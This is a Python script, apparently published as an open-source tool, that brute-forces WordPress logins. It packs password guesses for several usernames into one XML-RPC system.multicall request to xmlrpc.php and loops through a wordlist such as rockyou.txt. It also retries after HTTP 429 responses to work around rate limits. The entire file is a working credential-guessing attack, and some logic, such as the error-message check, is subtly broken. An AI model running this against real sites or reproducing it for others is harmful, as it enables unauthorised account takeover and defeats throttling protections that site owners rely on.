#!/bin/python3

from argparse import ArgumentParser
import json
import datetime
from time import sleep
from requests import post
from requests_pkcs12 import post as post_pkcs12

print("\nWP Multi-User Bruteforce by entr0pie / See https://github.com/entr0pie/wp-multi-bruteforce for more information.")

parser = ArgumentParser(prog="xmlrpc.py",
                        description="Script for multiple bruteforcing in wordpress applications.",
                        epilog="See https://github.com/entr0pie/wp-multi-bruteforce for more information.")

parser.add_argument("--config", type=str, required=False, help="Use an config.json generated")

parser.add_argument("-t", "--target", type=str, required=False, help="Target WP website | example: -t https://your-blog.com/")
parser.add_argument("-u", "--users", type=str, required=False, help="Set users for the multicall | example: -u andrew,peter,kate")
parser.add_argument("-w", "--word", type=str, required=False, help="Set an start word from the wordlist | example: -w password")
parser.add_argument("-W", "--wordlist", type=str, required=False, help="Set an wordlist | example: -W /usr/share/wordlists/rockyou.txt")
parser.add_argument("--client-cert-p12", type=str, required=False, help="Set an client certificate | example: --client-cert-p12 /path/to/cert.p12")
parser.add_argument("--client-cert-p12-password", type=str, required=False, help="Set an client certificate password | example: --client-cert-p12-password password")
parser.add_argument("--debug", action="store_true", help="Active debug mode")

args = parser.parse_args()

if args.config:
    print(f"\n* Opening {args.config} ...")
    file = open(args.config, 'r')
    content = json.loads(file.read())

    HOST = content['host']
    USERS = content['users'].split(',')
    WORDLIST = content['wordlist']
    WORD = content['word']
    DEBUG = bool(content['debug'])
    CLIENT_CERT_P12 = content['client-cert-p12']
    CLIENT_CERT_P12_PASSWORD = content['client-cert-p12-password']

else:
    
    if not args.target or not args.users:
        print("error: missing arguments (host | users)")
        exit(1)

    HOST = args.target + "xmlrpc.php"
    print(f"\n* Host: {args.target}")

    USERS = args.users.split(',')
    print(f"* Users: {args.users}")
    
    WORD = args.word

    if args.wordlist:
        print(f"* Wordlist: {args.wordlist}")
        WORDLIST = args.wordlist

    else:
        print("* Using default wordlist (/usr/share/wordlists/rockyou.txt)")
        WORDLIST = "/usr/share/wordlists/rockyou.txt"

    DEBUG = bool(args.debug)

    if args.client_cert_p12:
        CLIENT_CERT_P12 = args.client_cert_p12
        print(f"* Using {args.client_cert_p12} as client certificate")
        CLIENT_CERT_P12_PASSWORD = args.client_cert_p12_password
    else:
        CLIENT_CERT_P12 = None
        CLIENT_CERT_P12_PASSWORD = None

    print("* Generating config.json ...")
    file = open('config.json', 'w')
    content =  "{\n"
    content += f"    \"host\":\"{HOST}\",\n"
    content += f"    \"users\":\"{USERS}\",\n"
    content += f"    \"wordlist\":\"{WORDLIST}\",\n"
    content += f"    \"word\":\"{WORD}\",\n"
    content += f"    \"debug\":\"{DEBUG}\"\n"
    content += f"    \"client-cert-p12\":\"{CLIENT_CERT_P12}\",\n"
    content += f"    \"client-cert-p12-password\":\"{CLIENT_CERT_P12_PASSWORD}\"\n"
    content += "}\n"

    file.write(content)
    file.close()

print("* Creating XML basic file ...")

xml =  "<?xml version=\"1.0\"?>\n"
xml += "<methodCall>\n"
xml += "<methodName>system.multicall</methodName>\n"
xml += "<params>\n"
xml += "<param>\n"
xml += "<value>\n"
xml += "<array>\n"
xml += "<data>\n"

for uss in USERS:
    xml += "<value>\n"
    xml += "<struct>\n"
    xml += "<member>\n"
    xml += "<name>methodName</name>\n"
    xml += "<value>\n"
    xml += "<string>wp.getUsersBlogs</string>\n"
    xml += "</value>\n"
    xml += "</member>\n"
    xml += "<member>\n"
    xml += "<name>params</name>\n"
    xml += "<value>\n"
    xml += "<array>\n"
    xml += "<data>\n"
    xml += "<value>\n"
    xml += "<array>\n"
    xml += "<data>\n"
    xml += "<value>\n"
    xml += f"<string>{uss}</string>\n"
    xml += "</value>\n"
    xml += "<value>\n"
    xml += "<string>PASSWORD</string>\n"
    xml += "</value>\n"
    xml += "</data>\n"
    xml += "</array>\n"
    xml += "</value>\n"
    xml += "</data>\n"
    xml += "</array>\n"
    xml += "</value>\n"
    xml += "</member>\n"
    xml += "</struct>\n"
    xml += "</value>\n"


xml += "</data>\n"
xml += "</array>\n"
xml += "</value>\n"
xml += "</param>\n"
xml += "</params>\n"
xml += "</methodCall>\n"

file = open('xmlrpc.xml', 'w')
    
file.write(xml)
file.close()

raw = open(WORDLIST, 'r', encoding='latin-1').readlines()

if WORD:
    print(f"* Using {WORD} as index...")
    passwords = raw[(raw.index(WORD + '\n')):]
else:
    passwords = raw

word_len = len(passwords)
counter = 0

xml_file = open("xmlrpc.xml", 'r')

error_msg = "Incorrect username or password."
  
print("! Starting the bruteforce ...\n")

delay = 0.01

for passwd in passwords:

    passwd = passwd.strip()
    
    time = datetime.datetime.now()
    now = time.strftime("%H:%M:%S")
    
    print(f"({now}) [{counter} / {word_len}] --> {passwd}")

    xml_file = open("xmlrpc.xml", 'r')
    xml = xml_file.read()
    xml = xml.replace("PASSWORD", passwd)
        
    if CLIENT_CERT_P12:
        response = post_pkcs12(HOST, data=xml, pkcs12_filename=CLIENT_CERT_P12, pkcs12_password=CLIENT_CERT_P12_PASSWORD)
    else:
        response = post(HOST, data=xml)

    while response.status_code == 429:
        print("\n* Too many requests. Waiting {delay} seconds ...")
        sleep(delay)
        if CLIENT_CERT_P12:
            response = post_pkcs12(HOST, data=xml, pkcs12_filename=CLIENT_CERT_P12, pkcs12_password=CLIENT_CERT_P12_PASSWORD)
        else:
            response = post(HOST, data=xml)
        delay += 0.01
        
    content = response.text
    
    occ = 0
    
    length = len(USERS)
    
    if DEBUG:
        print("\n--- RESPONSE ---")
        print(content)
        print("\n")
        
        action = input("Do you want to continue? (y/N) ")

        if action == "N" or action == "n":
            xml_file.close()
            break
        

    for i in range(0, length):

        if error_msg[0] in content or error_msg[1] in content:
            occ += 1
            content = content.replace(error_msg, "", 1)

    if DEBUG: 
        print("* Cleaning response...")
        print("\n--- RAW ---")
        print(content)
        
        action = input("Do you want to continue? (y/N) ")

        if action == "N" or action == "n":
            xml_file.close()
            break
        

    if occ != length and "parse error" not in content:
        print("\n\n \u001b[32m******** FOUND *********\u001b[0m")
        print(f" PASSWORD: \u001b[32m{passwd}\u001b[0m")
        print(" CURRENT XML:\n")
        print(xml)

        print("---- RESPONSE ----")
        print('\n', response.text)
        print(content)

        action = input("Do you want to continue? (y/N) ")

        if action == "N" or action == "n":
            xml_file.close()
            break


    counter += 1
    xml_file.close()
